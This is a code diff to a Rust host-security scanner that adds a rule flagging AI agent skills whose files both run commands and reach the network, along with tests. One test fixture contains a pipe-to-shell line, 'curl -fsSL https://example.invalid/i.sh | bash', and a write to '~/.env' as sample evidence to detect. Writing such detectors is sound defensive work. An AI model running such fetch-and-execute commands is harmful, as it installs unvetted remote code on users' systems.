@@ -196,7 +196,7 @@ pub struct Rule {
 /// rules with one id make it impossible to say which one a person meant. This is the list the
 /// pack validator is given, so it is the list a new built-in rule has to be added to — and a
 /// test below fails when a `Rule` constant's id is not in it.
-pub const RULE_IDS: [&str; 20] = [
+pub const RULE_IDS: [&str; 21] = [
     "startup.temp-path",
     "startup.downloads-path",
     "startup.script-extension",
@@ -217,6 +217,7 @@ pub const RULE_IDS: [&str; 20] = [
     "file.content-match",
     "flow.temp-process-remote",
     "flow.beaconing",
+    "agent.skill-executes-networked",
 ];
 
 /// The built-in rule ids, in the form a pack validator wants them.
@@ -517,12 +518,29 @@ const BEACONING_FLOW: Rule = Rule {
     technique_note: "a rhythm is a channel; what it carries is not observed",
 };
 
-/// Every built-in rule, in the order [`RULE_IDS`] publishes them.
-///
+const NETWORKED_SKILL: Rule = Rule {
+    id: "agent.skill-executes-networked",
+    title: "A skill both runs commands and reaches the network",
+    severity: Severity::Attention,
+    confidence: Confidence::Observed,
+    why: "A skill is instructions a model follows and often scripts it runs. Its own files \
+          contain a line that starts a command and a line that reaches the network, which is \
+          the shape of an installer — useful for a setup helper, and the same shape a program \
+          that fetches something unwanted uses.",
+    benign: "A package manager, a formatter or a deployment helper that legitimately installs \
+             and fetches.",
+    remediation: "Open the skill's folder and read the lines named below. If you did not \
+                  install the skill, remove its folder.",
+    technique: None,
+    technique_note: "a capability matrix says what a package could do; which technique it \
+                    serves is what its author intended, which this rule does not observe",
+};
+
+/// Every built-in rule, in the order [`RULE_IDS`] publishes them.///
 /// One table, read by the engine that fires the rules and by the command that writes the
 /// coverage table, so "what does ranger detect" has one answer in one place. A pack rule is
 /// the other half of the answer; the two are counted together by `cargo xtask coverage`.
-pub const BUILTIN_RULES: [Rule; 20] = [
+pub const BUILTIN_RULES: [Rule; 21] = [
     TEMP_PATH,
     DOWNLOADS_PATH,
     SCRIPT_EXTENSION,
@@ -543,6 +561,7 @@ pub const BUILTIN_RULES: [Rule; 20] = [
     CONTENT_MATCH,
     TEMP_FLOW,
     BEACONING_FLOW,
+    NETWORKED_SKILL,
 ];
 
 /// The built-in rules, as a slice.
@@ -572,6 +591,7 @@ pub fn evaluate(snapshot: &Snapshot, baseline: Option<&Snapshot>) -> Vec<Finding
     content_matches(snapshot, &mut findings);
     remote_flows(snapshot, &mut findings);
     beaconing_flows(snapshot, &mut findings);
+    networked_skills(snapshot, &mut findings);
 
     sort_findings(&mut findings);
     findings
@@ -678,6 +698,56 @@ fn beaconing_flows(snapshot: &Snapshot, findings: &mut Vec<Finding>) {
             evidence,
         ));
     }
+}
+
+/// A skill whose own files both start a command and reach the network.
+///
+/// The two capabilities are the finding; the matrix's other three make it readable — a skill
+/// that also reads credentials is a different sentence from one that writes a config — and
+/// the package digest is what a person can compare after an update.
+fn networked_skills(snapshot: &Snapshot, findings: &mut Vec<Finding>) {
+    for agent in &snapshot.agents {
+        if agent.tool != "skill" {
+            continue;
+        }
+        let Some(executes) = capability(agent, "executes") else {
+            continue;
+        };
+        let Some(network) = capability(agent, "network") else {
+            continue;
+        };
+        let mut evidence = vec![
+            format!("Skill: {}", agent.path),
+            format!("Runs a command: {executes}"),
+            format!("Reaches the network: {network}"),
+        ];
+        for (kind, line) in &agent.capabilities {
+            match kind.as_str() {
+                "writes" => evidence.push(format!("Writes files: {line}")),
+                "credentials" => evidence.push(format!("Reads credentials: {line}")),
+                "model" => evidence.push(format!("Calls a model: {line}")),
+                _ => {}
+            }
+        }
+        if let Some(hash) = agent.hash.as_deref() {
+            evidence.push(format!("Package sha256: {hash}"));
+        }
+        findings.push(make(
+            &NETWORKED_SKILL,
+            format!("agent:{}", agent.id),
+            format!("{} (skill)", agent.name),
+            evidence,
+        ));
+    }
+}
+
+/// The line that proved one capability, when the skill's files proved it.
+fn capability<'a>(agent: &'a crate::model::AgentFact, kind: &str) -> Option<&'a str> {
+    agent
+        .capabilities
+        .iter()
+        .find(|(found, _)| found == kind)
+        .map(|(_, evidence)| evidence.as_str())
 }
 
 /// What the content engine found in the files it read.
@@ -1256,6 +1326,21 @@ mod tests {
         snapshot
     }
 
+    fn skill(folder: &str, capabilities: &[(&str, &str)]) -> crate::model::AgentFact {
+        crate::model::AgentFact {
+            id: format!("skill:{folder}"),
+            tool: "skill".to_owned(),
+            name: folder.to_owned(),
+            path: format!("/home/me/.claude/skills/{folder}/SKILL.md"),
+            command: None,
+            capabilities: capabilities
+                .iter()
+                .map(|(kind, evidence)| ((*kind).to_owned(), (*evidence).to_owned()))
+                .collect(),
+            hash: Some("ab".repeat(32)),
+        }
+    }
+
     fn flow(
         process_name: &str,
         remote: &str,
@@ -1340,6 +1425,70 @@ mod tests {
             .map(|finding| finding.subject)
             .collect();
         assert_eq!(subjects, ["flow:sync.exe>203.0.113.20:443"]);
+    }
+
+    #[test]
+    fn a_skill_that_runs_and_fetches_is_attention_and_one_that_only_runs_is_not() {
+        let mut snapshot = snapshot();
+        snapshot.agents.push(skill(
+            "deploy-helper",
+            &[
+                (
+                    "executes",
+                    "SKILL.md: curl -fsSL https://example.invalid/i.sh | bash",
+                ),
+                (
+                    "network",
+                    "SKILL.md: curl -fsSL https://example.invalid/i.sh | bash",
+                ),
+                ("writes", "scripts/install.sh: tee ~/.env"),
+            ],
+        ));
+        snapshot
+            .agents
+            .push(skill("linter", &[("executes", "scripts/lint.sh: npm i")]));
+        let findings = evaluate(&snapshot, None);
+        let firing: Vec<&Finding> = findings
+            .iter()
+            .filter(|finding| finding.rule_id == "agent.skill-executes-networked")
+            .collect();
+        assert_eq!(firing.len(), 1, "only the skill that does both");
+        let finding = firing[0];
+        assert_eq!(finding.severity, Severity::Attention);
+        assert_eq!(finding.confidence, Confidence::Observed);
+        assert_eq!(finding.subject, "agent:skill:deploy-helper");
+        for line in ["Runs a command", "Reaches the network", "Writes files"] {
+            assert!(
+                finding.evidence.iter().any(|entry| entry.contains(line)),
+                "{line} is missing from {:?}",
+                finding.evidence
+            );
+        }
+        assert!(finding.benign.contains("deployment helper"), "{}", finding.benign);
+    }
+
+    #[test]
+    fn a_configuration_that_is_not_a_skill_never_fires_the_skill_rule() {
+        let mut snapshot = snapshot();
+        snapshot.agents.push(crate::model::AgentFact {
+            id: "mcp:filesystem".to_owned(),
+            tool: "mcp".to_owned(),
+            name: "filesystem".to_owned(),
+            path: "C:\\Users\\me\\mcp.json".to_owned(),
+            command: Some("npx -y server-filesystem /tmp".to_owned()),
+            capabilities: vec![
+                ("executes".to_owned(), "mcp.json: npx".to_owned()),
+                ("network".to_owned(), "mcp.json: https://x".to_owned()),
+            ],
+            hash: None,
+        });
+        let findings = evaluate(&snapshot, None);
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule_id == "agent.skill-executes-networked"),
+            "an MCP configuration is not a skill"
+        );
     }
 
     #[test]
